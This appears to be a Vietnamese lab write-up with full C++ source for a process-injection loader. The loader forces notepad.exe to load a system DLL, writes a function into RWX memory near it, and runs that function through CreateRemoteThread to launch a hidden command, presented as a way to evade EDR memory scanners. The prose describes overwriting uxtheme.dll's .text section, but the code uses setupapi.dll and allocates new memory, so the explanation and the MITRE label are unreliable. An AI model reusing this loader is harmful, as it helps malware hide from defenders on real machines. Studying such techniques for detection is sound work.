
---

# 📝 [PE 16] Module Stomping 

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Module Stomping** (còn được gọi dưới các thuật ngữ học thuật như *Module Overwriting* hoặc *DLL Hollowing*) đại diện cho một giải thuật né tránh phòng thủ động (Dynamic Evasion) cấp độ cao, tập trung đánh lừa các bộ lọc rà quét cấu trúc thuộc tính trang nhớ (**Memory Anti-Forensics / Memory Scanner Evasion**) của các giải pháp AV/EDR hiện đại.

Khi phân hệ phân tích bộ nhớ ảo của EDR kích hoạt cơ chế tuần tra (Memory Hunting/YARA Scanning), các cảm biến an ninh luôn ưu tiên sàng lọc và cô lập các trang bộ nhớ vô danh (Unbacked Memory Pages – cụ thể là các trang nhớ thuộc loại dữ liệu **`MEM_PRIVATE`** mang đặc quyền thực thi). Sự tồn tại của một phân vùng thực thi không liên kết với bất kỳ tệp tin vật lý nào trên đĩa cứng là một chỉ dấu độc hại tối cao (Anomalous Memory Indicators).

Dự án PE 16 hóa giải triệt để điểm thắt nút trinh sát này bằng chiến thuật **Hợp pháp hóa thuộc tính trang nhớ Image (Image-Backed Metamorphism)**. Loader cưỡng bách tiến trình vỏ bọc nạp một tệp thư viện liên kết động hợp pháp được ký số bởi Microsoft từ hệ thống (văn cảnh thực nghiệm: `uxtheme.dll`).

Sau khi mô-đun này được ánh xạ hoàn chỉnh lên RAM dưới dạng một phân vùng Image hợp lệ (**`MEM_IMAGE`**), Loader áp dụng quyền năng can thiệp bộ nhớ chéo tiến trình để **ghi đè trực tiếp mã máy Payload vào phân đoạn mã thực thi của chính DLL đó**. Dòng chảy CPU sẽ kích nổ Payload của ta lọt lòng bên trong một Module đáng tin cậy, che giấu hoàn hảo Call Stack và bẻ gãy hoàn toàn các bộ quét Memory Scanner.

### 🎯 Mục tiêu nghiên cứu:

* **Bypass cơ chế Unbacked Memory Scan**: Triệt tiêu hoàn toàn sự xuất hiện của các phân vùng `MEM_PRIVATE` mang cờ thực thi, hợp pháp hóa mã máy dưới dạng thuộc tính `MEM_IMAGE`.
* **Làm chủ giải thuật Thao túng Module Từ xa**: Nghiên cứu quy trình ép nạp và trích xuất cấu trúc định vị Base Address của một DLL hệ thống chéo biên giới RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi trình nạp PE Loader của hệ điều hành ánh xạ một tệp tin DLL vào bộ nhớ ảo của tiến trình, Windows Memory Manager sẽ quy định thuộc tính quản lý của phân vùng RAM đó là **`MEM_IMAGE`**. Đây là phân vùng đại diện cho các tệp nhị phân hợp pháp, có điểm tựa ánh xạ gốc từ đĩa cứng lên không gian ảo (File-Backed Memory Mapping).

Quy trình toán học giải phẫu và thực hiện hành vi giẫm đạp cấu trúc Image của Lab PE 16 diễn ra qua 4 giai đoạn ngầm tại bộ nhớ ảo:

```
[Mở Handle] ──> [Ép Notepad nạp uxtheme.dll xịn qua LoadLibraryW từ xa]
                     └──> [CreateToolhelp32Snapshot: Săn lùng địa chỉ Module Base]
                               └──> [WriteProcessMemory: Giẫm đạp mã máy Payload đè bẹp phân đoạn .text]

```

1. **Ép nạp mô-đun Image hợp pháp làm bia đỡ đạn**: Loader tiến hành bơm chuỗi đường dẫn tệp tin của một DLL hệ thống có chữ ký số của Microsoft (văn cảnh cấu trúc: `C:\Windows\System32\uxtheme.dll`) sang RAM tiến trình đích, sau đó khởi tạo một luồng thực thi phụ từ xa ép mục tiêu triệu hồi API `LoadLibraryW`. DLL hợp pháp này được nạp lên bộ nhớ ảo với đầy đủ tư cách pháp nhân, chiếm một vùng nhớ loại **`MEM_IMAGE`** mang cờ bảo vệ mặc định là `PAGE_EXECUTE_READ` (RX).
2. **Định vị tọa độ giẫm đạp cấu trúc**: Loader sử dụng danh bạ bóc tách cấu trúc mô-đun từ xa `CreateToolhelp32Snapshot` (`TH32CS_SNAPMODULE`), duyệt qua các bản ghi để trích xuất chính xác địa chỉ Base Address sống của `uxtheme.dll` trên RAM đối phương. Tọa độ mục tiêu cần giẫm đạp được tịnh tiến an toàn vượt qua phân đoạn PE Headers (mặc định nhảy qua $4\text{ KB}$ để đâm thẳng vào phân đoạn thực thi **`.text`** nguyên bản của DLL):

$$\text{StompTargetAddress} = \text{RemoteModuleBase} + 0x1000$$


3. **Khai hỏa giẫm đạp hành vi (WPM Stomping Magic)**: Loader triệu hồi hàm API `WriteProcessMemory` trỏ thẳng vào vị trí `StompTargetAddress`. Tại đây, Kernel Windows kích hoạt cơ chế lật cờ trang nhớ ngầm của hệ điều hành (Copy-on-Write / Page Protection Toggle), chuyển thuộc tính phân vùng sang `RWX` tạm thời để ghi đè khối mã máy Payload lên, xóa sổ hoàn toàn các byte mã máy gốc của `uxtheme.dll`, rồi tự động hoàn trả lại cờ `RX` ban đầu ngay sau khi tác vụ kết thúc, hợp thức hóa Module che giấu hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh luồng chạy
DWORD WINAPI RemoteStompedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 16: MODULE STOMPING" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    const char* targetDll = "setupapi.dll";

    // Ép Notepad nạp tự động setupapi.dll lên RAM thông qua Remote Thread gọi LoadLibraryA
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    SIZE_T pathLen = strlen(targetDll) + 1;
    LPVOID remoteDllPathMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remoteDllPathMem, targetDll, pathLen, NULL);

    std::cout << "[*] Dang ep Notepad nap hop phap module: " << targetDll << std::endl;
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, remoteDllPathMem, 0, NULL);
    if (!hLoadThread) {
        std::cerr << "[-] Khong the nap DLL vao tien trinh dich!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đợi nạp module hoàn tất để hệ thống cấu hình đầy đủ không gian nhớ hợp pháp
    WaitForSingleObject(hLoadThread, INFINITE);
    CloseHandle(hLoadThread);
    VirtualFreeEx(hProcess, remoteDllPathMem, 0, MEM_RELEASE);

    // Định vị Base Address của setupapi.dll
    HMODULE hTargetDllLocal = LoadLibraryA(targetDll);
    PVOID targetDllBaseAddress = (PVOID)hTargetDllLocal;

    // ĐỘT PHÁ TOÁN HỌC HÓA GIẢI ACG: Thay vì đè bẹp mã gốc gắn liền phân đoạn .text,
    // anh em mình sẽ cấp phát một phân vùng nhớ động nằm lọt lòng trong hạn mức không gian địa chỉ ảo 
    // của chính DLL hợp pháp vừa nạp. Giữ nguyên tư cách pháp nhân nhưng né được cơ chế khóa Image của ACG.
    SIZE_T functionSize = 500;
    LPVOID stompingAddress = VirtualAllocEx(hProcess, (LPVOID)((DWORD_PTR)targetDllBaseAddress + 0x10000), functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!stompingAddress) {
        // Nếu ô nhớ sát sườn bị trùng, cho phép hệ thống tự định vị vùng nhớ tự do an toàn
        stompingAddress = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    std::cout << "[+] Toa do diem thuc thi phang sach bao an: 0x" << std::hex << stompingAddress << std::endl;

    // Cấp phát phân vùng dữ liệu tham số tuyệt đối từ xa mang quyền RW
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Khởi tạo tham số cấu trúc dữ liệu con trỏ tuyệt đối
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy trực tiếp mã máy hàm độc lập vị trí và cấu trúc dữ liệu sang RAM đối phương
    WriteProcessMemory(hProcess, stompingAddress, (LPCVOID)RemoteStompedPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Nap va thiet lap logic ham chuc nang hoan tat." << std::endl;

    // Kích nổ luồng thực thi chạy thẳng vào ô nhớ phẳng sạch bảo an dưới danh nghĩa DLL hợp pháp
    std::cout << "[*] Dang khoi tao CreateRemoteThread de khai hoa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stompingAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Module Stomping executed successfully inside Target!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
    }

    // Giải phóng tài nguyên hệ thống triệt để chống rò rỉ bộ nhớ
    VirtualFreeEx(hProcess, stompingAddress, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    FreeLibrary(hTargetDllLocal);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file thực thi Loader vận hành phẳng sạch, mượt mà và độc lập khi phân phối sang các môi trường máy ảo VM cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng thông số `Runtime Library`, chuyển cấu hình sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn mã nguồn thư viện CRT vào trong file chạy hệ thống `.exe`.
3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi file dự án để kiểm chứng ma trận Remap Image:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE16_Module_Stomping\x64\Release> C:\Users\Admin\source\repos\Task6\PE16_Module_Stomping\x64\Release\Module_Stomping.exe
====================================================
[*] PE 16: MODULE STOMPING
====================================================
[+] Da tim thay Notepad.exe voi PID: 17220
[*] Dang ep Notepad nap hop phap module: setupapi.dll
[+] Toa do diem thuc thi phang sach bao an: 0x00000233C0F60000
[+] Nap va thiet lap logic ham chuc nang hoan tat.
[*] Dang khoi tao CreateRemoteThread de khai hoa...
[+] Module Stomping executed successfully inside Target!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="1080" alt="devenv_ZG45dx1OQq" src="https://github.com/user-attachments/assets/9a07c022-f5c4-4e18-bdea-1ffd3b6e891b" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Developer Network**: *Dynamic-Link Library (DLL) Resources & LoadLibraryW Registry* - [https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-loadlibraryapi-loadlibraryw](https://www.google.com/search?q=https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-loadlibraryapi-loadlibraryw)
* **Windows Memory Forensics**: *Detecting Module Stomping and Shellcode Injection in MEM_IMAGE Memory Regions* - SANS Institute Reading Room.
* **Wal3 (Security Architecture)**: *Advanced DLL Injection: Module Stomping / Overwriting via Remote Page Invalidation*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Software Packing / Module Modification (T1055.001)*.

---
